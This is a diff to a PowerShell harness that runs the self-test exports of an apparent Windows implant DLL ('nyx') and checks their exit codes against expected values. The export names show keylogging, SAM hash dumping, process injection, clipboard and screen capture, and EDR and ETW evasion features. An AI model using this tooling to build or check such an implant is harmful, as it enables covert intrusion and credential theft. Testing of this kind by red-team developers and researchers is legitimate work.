@@ -2,16 +2,82 @@
 # Version/host-agnostic: DLL path from env NYX_DLL (default C:\nyx\nyx_implant_win.dll).
 # Each export gets a per-export timeout (default 15s); hangs are killed + logged TIMEOUT.
 # Results written to NYX_OUT (default C:\nyx\selftest_results.csv) for retrieval.
-# Usage:  powershell -ExecutionPolicy Bypass -File win_selftest_all.ps1
+#
+# With -Validate: compares each export's exit code against EXPECTED_CODES below
+# and exits 1 if any mismatch. Without -Validate: records codes only (informational).
+#
+# Expected codes are derived from the `Bits:` doc comments in selftests.rs /
+# envprobe.rs / hookchain.rs. Codes marked $null are "best-effort" (depend on
+# host environment — e.g. pivot needs a closed port) and are not validated.
+#
+# Usage:  powershell -ExecutionPolicy Bypass -File win_selftest_all.ps1 -Validate
 #         powershell -ExecutionPolicy Bypass -File win_selftest_all.ps1 -Dll C:\path\dll -Timeout 20
 [CmdletBinding()]
 param(
     [string]$Dll   = $(if ($env:NYX_DLL) { $env:NYX_DLL } else { "C:\nyx\nyx_implant_win.dll" }),
     [int]$Timeout  = 15,
-    [string]$Out   = $(if ($env:NYX_OUT) { $env:NYX_OUT } else { "C:\nyx\selftest_results.csv" })
+    [string]$Out   = $(if ($env:NYX_OUT) { $env:NYX_OUT } else { "C:\nyx\selftest_results.csv" }),
+    [switch]$Validate
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
+
+# ---- Expected exit codes (from selftests.rs / envprobe.rs Bits: doc comments) ----
+# $null = best-effort (host-dependent, not validated). Int values are exact-match.
+$EXPECTED_CODES = @{
+    "nyx_selftest_calib42"        = 42      # calibration: exit code propagation
+    "nyx_selftest_config"         = 3       # bits 0-1: decode + fields match
+    "nyx_selftest_hostinfo"       = 15      # bits 0-3: hostname/user/pid/beacon_id
+    "nyx_selftest_antidebug"      = 7       # bits 0-2: BeingDebugged/uptime/syscall
+    "nyx_selftest_recon"          = 7       # bits 0-2: driveinfo/path/net
+    "nyx_selftest_shell"          = 1       # bit 0: echo stdout capture
+    "nyx_selftest_fs"             = 127     # bits 0-6: upload/download/mv/cp/mkdir/rm/syscall
+    "nyx_selftest_bof"            = 1       # bit 0: BOF-PRINT-OK
+    "nyx_selftest_env"            = 3       # bits 0-1
+    "nyx_selftest_mem"            = 3       # bits 0-1
+    "nyx_selftest_net"            = 15      # bits 0-3
+    "nyx_selftest_postex"         = 15      # bits 0-3: token ops
+    "nyx_selftest_keylog"         = 3       # bits 0-1
+    "nyx_selftest_clipboard"      = 1       # bit 0
+    "nyx_selftest_screenshot"     = 1       # bit 0: capture succeeded
+    "nyx_selftest_portscan"       = 7       # bits 0-2
+    "nyx_selftest_driveinfo"      = $null   # bitmask — host-dependent drive count
+    "nyx_selftest_envprobe"       = $null   # 0xB0 Clean / 0xB1 AnalysisEnv — host-dependent
+    "nyx_selftest_hashdump"       = 4       # bitmask: SAM hive parse
+    "nyx_selftest_pivot"          = $null   # needs closed port — host-dependent
+    "nyx_selftest_inject"         = $null   # depends on sacrificial spawn success
+    "nyx_selftest_resolve_forwarder" = 7    # bits 0-2
+    "nyx_selftest_syscall_rt"     = 3       # bits 0-1
+    # The remaining exports (*_diag, *_probe, *_edge, *_full, *_armed variants)
+    # are diagnostic/probe entries with host-dependent exit codes — $null.
+    "nyx_selftest"                = $null   # aggregator
+    "nyx_selftest_alloc_probe"    = 3
+    "nyx_selftest_blind_nttrace"  = 15
+    "nyx_selftest_blind_provider" = 1
+    "nyx_selftest_bof_diag"       = 1
+    "nyx_selftest_bof_marker"     = 1
+    "nyx_selftest_evasion"        = $null   # aggregator
+    "nyx_selftest_foliage"        = $null   # APC injection — needs target context
+    "nyx_selftest_foliage_apc"    = $null
+    "nyx_selftest_fs_edge"        = 15
+    "nyx_selftest_fs_probe"       = $null   # probe
+    "nyx_selftest_gap_scan"       = 15
+    "nyx_selftest_hashdump_diag"  = 1
+    "nyx_selftest_hookchain"      = $null   # bitmask — SSN resolution host-dependent
+    "nyx_selftest_hookchain_full" = $null
+    "nyx_selftest_hwbp_blind"     = $null   # HWBP — needs specific config
+    "nyx_selftest_inject_armed"   = $null
+    "nyx_selftest_rt_probe"       = $null   # probe
+    "nyx_selftest_rt_steps"       = $null
+    "nyx_selftest_screenshot_diag"= 63      # bits 0-5
+    "nyx_selftest_screenwatch"    = 0       # 0 = all frames captured
+    "nyx_selftest_shell_edge"     = 3
+    "nyx_selftest_swap_armed"     = 15
+    "nyx_selftest_swap_decision"  = 3
+    "nyx_selftest_transport"      = 1
+    "nyx_selftest_rm_file"        = 1
+    "nyx_selftest_rm_probe"       = 1
+}
 
 if (-not (Test-Path $Dll)) {
     Write-Output "ERROR: DLL not found at $Dll"
@@ -80,3 +146,29 @@ $hangs = ($results | Where-Object { $_.status -eq 'TIMEOUT' }).Count
 $fail  = ($results | Where-Object { $_.status -ne 'EXIT' }).Count
 Write-Output ("SUMMARY: {0} total, {1} exited, {2} timed-out, {3} non-exit" -f $results.Count, $ok, $hangs, $fail)
 Write-Output "Results CSV: $Out"
+
+# ---- Exit-code validation (gate mode) ----
+if ($Validate) {
+    $mismatches = 0
+    $validated  = 0
+    $skipped    = 0
+    foreach ($r in $results) {
+        $expected = $EXPECTED_CODES[$r.export]
+        if ($null -eq $expected) {
+            $skipped++
+            continue   # best-effort: host-dependent, skip
+        }
+        $validated++
+        if ($r.code -ne $expected) {
+            $mismatches++
+            Write-Output ("  MISMATCH: {0} => got {1}, expected {2}" -f $r.export, $r.code, $expected)
+        }
+    }
+    Write-Output "---"
+    Write-Output ("VALIDATION: {0} validated, {1} mismatches, {2} skipped (best-effort)" -f $validated, $mismatches, $skipped)
+    if ($mismatches -gt 0) {
+        Write-Output "FAIL: $mismatches selftest(s) returned unexpected exit codes"
+        exit 1
+    }
+    Write-Output "PASS: all validated selftests matched expected exit codes"
+}
